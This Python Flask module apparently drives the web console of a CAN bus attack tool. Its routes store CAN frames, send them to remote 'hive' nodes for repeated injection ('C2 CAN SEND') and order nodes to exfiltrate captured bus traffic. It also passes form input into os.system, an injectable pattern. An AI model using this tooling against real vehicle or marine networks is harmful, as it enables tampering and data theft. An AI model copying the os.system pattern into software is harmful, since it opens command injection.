from flask import Blueprint, render_template, redirect, url_for, request, flash,Flask
from flask_login import login_user, login_required, current_user
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import or_, cast
# from test import info, interfaces,nodes
from cmath import atan
import os, random, pathlib
import can
from can.message import Message
import time
from threading import Thread
from time import sleep
import json

from multiprocessing import Process

from . import db,info,interfaces,nodes
# from test import db,info,interfaces,nodes

import sys
import os


app = Flask(__name__)


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from hive.server_class import Server
from hive.client_class import Client




main = Blueprint('main', __name__)

# Search filter statuses
search_state = {"message_desc":True,"can_interface":True,"arb_id":True,"data_string":True,"id":True}
startedVar = False

jsonTemplates = json.load(open("./hive/message_templates.json"))

server_port = 2023
client_port = 4000


attacks = {}

# To view list of all messages
@main.route('/table/', methods=['GET'])
@login_required
def table():
    global startedVar
    if(startedVar == False):
        startedVar=True
        t = Thread(target=start)
        t.start()
    search_string = request.args.get('search_string')
    filter_type = request.args.get('filter_type')

    if(search_string):
        print("search string")
        data = info.query.filter(or_(
        info.message_desc.contains(search_string),
        info.can_interface.contains(search_string),
        info.arb_id.contains(search_string),
        info.data_string.contains(search_string)
        ))
    else:
        # print("no search string")
        search_string = ''
        data = info.query
    
    print(f'{type(filter_type)}')

    if(not filter_type or not filter_type in search_state):
        # filter_type doesn't exist or is invalid
        data = data.order_by(info.message_desc.asc()).all()
        return render_template('table.html', data=data, search_string=search_string, sort_col='message_desc', sort_direction=0)
    
    elif(filter_type == 'message_desc'):
        if(search_state['message_desc']):
            data = data.order_by(info.message_desc.asc()).all()
        else:
            data = data.order_by(info.message_desc.desc()).all()
        search_state['message_desc'] = not search_state['message_desc']

    elif(filter_type == 'can_interface'):
        if(search_state['can_interface']):
            data = data.order_by(info.can_interface.asc()).all()
        else:
            data = data.order_by(info.can_interface.desc()).all()
        search_state['can_interface'] = not search_state['can_interface']

    elif(filter_type == 'arb_id'):
        if(search_state['arb_id']):
            data = data.order_by(info.arb_id.asc()).all()
        else:
            data = data.order_by(info.arb_id.desc()).all()
        search_state['arb_id'] = not search_state['arb_id']

    elif(filter_type == 'data_string'):
        if(search_state['data_string']):
            data = data.order_by(info.data_string.asc()).all()
        else:
            data = data.order_by(info.data_string.desc()).all()
        search_state['data_string'] = not search_state['data_string']

    elif(filter_type == 'id'):
        if(search_state['id']):
            data = data.order_by(cast(info.id,db.Integer).asc()).all()
        else:
            data = data.order_by(cast(info.id,db.Integer).desc()).all()
        search_state['id'] = not search_state['id']

    return render_template('table.html', data=data, search_string=search_string, sort_col=filter_type, sort_direction=search_state[filter_type])

# To view and modify message
@main.route('/inspect/<id>', methods=['GET', 'POST'])
@login_required
def inspect(id):
    if(request.method == 'GET'):
        print(id)
        print("Here")
        # Populate with data based on passed ID
        data = info.query.filter(info.id == id).first()
        if(not data):
            return redirect(url_for('main.table'))
        
        Server.lock.acquire()
        nodes = Server.nodes
        Server.lock.release() 
        if not nodes:
            return render_template('inspect.html', data=data)
        return render_template('inspect.html', data=data, current_nodes=nodes)

# To add a new message
@main.route('/add',methods=['POST'])
@login_required
def addToTable():
    try:
        _primary_key = info.query.count()
        _message_desc = request.form['new_desc']
        _can_interface = request.form['new_can']
        _arb_id = int(request.form['new_arb'], 16)
        _data_string = int(request.form['new_data'], 16)
        _notes = 'notes'
        _looping = request.form['new_looping'] # not yet implemented in client side
        
        info.insert(_primary_key,_message_desc,_can_interface,_arb_id,_data_string, _notes,_looping)
        return redirect(url_for('main.table'))
    
    except:
        return redirect(url_for('main.table'))
    
# To update an existing message
@main.route('/update/<id>',methods=['POST'])
@login_required
def modifyEntry(id): #Gotta update for looping as well!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    
    builder = '/inspect/' + str(id)
    entry = info.query.filter_by(id=id).one()

    try:
        entry.notes = request.form['notes']
        db.session.commit()
        flash('Notes updated')
        return redirect(url_for('main.inspect',id=id))
    except: ()
    
    if(len(request.form['message_desc']) == 0):
        flash('Missing or invalid message description')
        # flash that message
        return redirect(url_for('main.inspect',id=id))

    entry.message_desc = request.form['message_desc']

    if(len(request.form['can_interface']) == 0):
        flash('Missing or invalid CAN Interface')
        # flash that message
        return redirect(url_for('main.inspect',id=id))

    entry.can_interface = request.form['can_interface']

    try:
        # Check for valid hex value
        entry.arb_id = int(request.form['arb_id'], 16)
        # Convert to decimal for storage
        #_arb_id = int(_arb_id)
    except:
        flash('Missing or invalid Arb-ID')
        # flash that message
        return redirect(url_for('main.inspect',id=id))

    try:
        # Check for valid hex value
        entry.data_string = int(request.form['data_string'], 16)
        # Convert to decimal for storage
        #_data_string = int(request.form['data_string'], 16)
    except:
        flash('Missing or invalid data string')
        # flash that message
        return redirect(url_for('main.inspect',id=id))
    
    try:
        _notes = request.form['notes']

        if(_notes):
            entry.notes = _notes
    except: ()
 
    # If everything passes the checks
    db.session.commit()
    flash('nominally updated')

    return redirect(url_for('main.inspect',id=id))

# To delete an existing message
@main.route('/delete/<id>',methods=['POST'])
@login_required
def deleteFromTable(id):

    _primary_key = id
    # info.query.filter(info.id == _primary_key).delete()
    obj = info.query.filter_by(id = _primary_key).one()
    db.session.delete(obj)
    db.session.commit()

    return redirect(url_for('main.table'))

# For future use
#Maintain the state of whether or not we're sending
looping_state = False
#make sure bustype="socketcan"

#Function to handle functionality behind child processes for looping attacks
################### Note to self, look into passing the whole bus object instead ###########
def canLooping(_name,_bitrate,_data_bitrate,_fd_msg,_arb_id,_data):

    print(_name)
    print(_bitrate)
    print(_data_bitrate)
    print(_fd_msg)
    print(_arb_id)
    print(_data)

    with can.interface.Bus(channel=_name,bustype='socketcan',bitrate=_bitrate,data_bitrate=_data_bitrate,fd=_fd_msg) as bus:
        print("message creation start")
        msg = can.Message(
            arbitration_id=_arb_id, data=_data, is_extended_id=True #NMEA IS EXTENDED FRAMES!!!!!
        )

        print(msg)
        try:
            while looping_state:
                bus.send(msg)
                print("Message sent.")
                flash("Message sent.")
                time.sleep(0.008)
        except can.CanError:
            print("Message NOT sent")
            flash("Message not sent :(")
        except:
            print("its all broken")
            ################################

@main.route('/send/<id>', methods=['POST'])
@login_required
def send(id):
    # C2 CAN SEND
    # global looping_state

    data = info.query.filter(info.id == id).first()

    #assume already initalized?
    print('trying to send')
    #Get FD Status
    _can_interface = request.form['interface_place'].split()[0]
    print(_can_interface)
    _arb_id = request.form['arb_place']
    _dataString = request.form['data_place']
    _looping = request.form['looping_place']
    _node_id = request.form['node_place']
    _node_id = str(_node_id)
    print("node_id " +_node_id)
    print("looping =", _looping)

    if(_looping == "1"): #1 means global looping is on.
        looping_state="start"        
    else:
        looping_state="stop" #not 1 means looping is off.
    # try:
    # _data = bytes.fromhex(_dataString)
    # _arb_id = int(_arb_id,16)
    print(_arb_id)
    print("test formatting")
    
    dataList = []
    Server.lock.acquire()
    dataList.append(_can_interface)
    dataList.append(_arb_id)
    dataList.append(_dataString)
    dataList.append(looping_state)
    print(jsonTemplates['loop_command'])
    jsonCopy = jsonTemplates['loop_command']
    jsonCopy['data'] = str(dataList)
    print("Client> Sending: ",json.dumps(jsonCopy))
# def send(self,ip,source_port,destination_port,data):

    #get that node ip and port
    dest_ip = Server.nodes[_node_id][0]
    source_port = Server.nodes[_node_id][1]
    print(dest_ip,source_port)
    print(client_port)
    print(dest_ip)
    print(source_port)
    print(jsonCopy)
    Server.lock.release()
    
    
    Server.send(Server,dest_ip,source_port,client_port,jsonCopy)
    Server.recieve(Server,source_port)    
    
    
    Server.lock.acquire()
    nodes = Server.nodes
    Server.lock.release() 
    if not nodes:
        return render_template('inspect.html', data=data)
    return render_template('inspect.html', data=data, current_nodes=nodes)
        # print("Error sending :(")
        # return render_template('inspect.html', data=data)

 

@main.route('/interface')
@login_required
def interface():
    data=interfaces.query
    print(data)
    return render_template('interface.html',data=data)

@main.route('/init', methods=['POST'])
@login_required
def init():
    path = pathlib.Path(__file__).parent.resolve() / request.form['type']
    print(str(path) + ' 500000')
    os.system(str(path) + ' 500000')
    flash('Ran script ' + request.form['type'])
    return redirect(url_for('main.interface'))

@main.route('/command')
@login_required
def command():
    return render_template('command.html')

@main.route('/exfil', methods=['GET', 'POST'])
@login_required
def exfil():
    Server.lock.acquire()
    current_nodes = Server.nodes
    Server.lock.release()
    if(request.method == 'POST'):    
        print("IN EXFIL")
        node = request.form['node_place']
        data = [request.form['d_can'], request.form['d_arb'], request.form['d_mask'], request.form['d_time']]
        jsonCopy = jsonTemplates['exfil_dat']
        print("Gargage-Can> Exfil Template",jsonCopy)
        jsonCopy['data'] = str(data)


        Server.lock.acquire()

        print("Client> Sending: ",json.dumps(jsonCopy))
    # def send(self,ip,source_port,destination_port,data):

        #get that node ip and port
        dest_ip = Server.nodes[node][0]
        source_port = Server.nodes[node][1]
        print(dest_ip,source_port)
        print(client_port)
        print(dest_ip)
        print(source_port)
        print(jsonCopy)

        Server.lock.release()
        #Send message
        Server.send(Server,dest_ip,source_port,client_port,jsonCopy)
        Server.recieve(Server,source_port)  
        #Recieve file
        file = Server.normal_recieve(Server,source_port)
        print("The main code",file)

        return render_template('exfil.html',data=file,current_nodes=current_nodes)
    return render_template('exfil.html',current_nodes=current_nodes)
    
@main.route('/cant', methods=['GET', 'POST'])
@login_required
def cant():
    if(request.method == 'GET'):
        return render_template('cant.html')
    
    path = pathlib.Path(__file__).parent.resolve() / request.form['type']
    os.system(str(path))
    flash('Ran script ' + request.form['type'])
    return redirect(url_for('main.cant'))

@main.route('/nodes', methods=['GET', 'POST'])
@login_required
def node():
    if(request.method == 'GET'):
        print("Yes im here  :)")
        print(type(nodes))
        data=nodes.query
        print(data)
        Server.lock.acquire()
        print(Server.nodes)
        current_nodes = Server.nodes
        Server.lock.release()

        return render_template('nodes.html',current_nodes=current_nodes)
    



# Run
# looping_state = Value('b', False)
# p = Process(target=canLooping, args=(looping_state,))


def start():


    print("Garbage> Client port,",client_port)
    print("Garbage> Server port:",server_port)
    jsonTemplates = json.load(open("./hive/message_templates.json"))
    
    server = Server(server_port,client_port) 
    server.initalize()


    client = Client(server,jsonTemplates)
    serverThread = Thread(target=server.listening_nodes,args=()) #Wehn you make a thread/process dont have () in the target... that took way too long.
    # clientThread = Thread(target=client.menu,args=()) #Needs to be a thread not a process otherwise the menu wont work
    # clientThread.start()
    serverThread.start()
    
    while True:
       pass

if(__name__ == '__main__'):
    #os.system('initialize.sh')
    app.run(debug=True,host='0.0.0.0',use_reloader=True,port='7865') #use_reloader=False needed for the child stuff


